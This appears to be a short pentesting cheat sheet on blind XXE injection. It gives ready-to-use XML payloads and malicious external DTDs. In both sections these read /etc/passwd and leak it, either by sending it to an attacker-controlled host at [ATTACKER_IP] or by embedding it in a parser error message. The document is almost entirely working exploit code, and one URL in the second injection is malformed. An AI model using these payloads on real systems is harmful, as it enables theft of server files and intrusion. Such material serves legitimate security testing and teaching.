#xmli #xxe #xml

# By Sending to External Server
**Warning:** Due to the API that validate characters used by XML parsers, this technique might not work with some file contents like newline characters.

## Attacker Machine
Expose this file on a web server (`/malicious.dtd`):
```xml
<!ENTITY % file SYSTEM "file:///etc/passwd">
<!ENTITY % eval "<!ENTITY &#x25; exfiltrate SYSTEM 'https://[ATTACKER_IP]/?c=%file;'>">
%eval;
%exfiltrate;
```

## Code
```xml
<?xml version="1.0" encoding="UTF-8"?>
<productId>1</productId>
```

## Injection (XML Parameter)
```xml
<?xml version="1.0"?>
<!DOCTYPE foo [<!ENTITY % myParam SYSTEM "https://[ATTACKER_IP]/malicious.dtd"> %myParam;]>
<productId>1</productId>
```


# By Provoking an Error Message 
## Attacker Machine
Expose this file on a web server (`/malicious.dtd`):
```xml
<!ENTITY % file SYSTEM "file:///etc/passwd">
<!ENTITY % eval "<!ENTITY &#x25; error SYSTEM 'file:///nonexistent/%file;'>">
%eval;
%error;
```

## Code
```xml
<?xml version="1.0" encoding="UTF-8"?>
<productId>1</productId>
```

## Injection (XML Parameter)
```xml
<?xml version="1.0"?>
<!DOCTYPE foo [<!ENTITY % myParam SYSTEM "https:/=/[ATTACKER_IP]/malicious.dtd"> %myParam;]>
<productId>1</productId>
```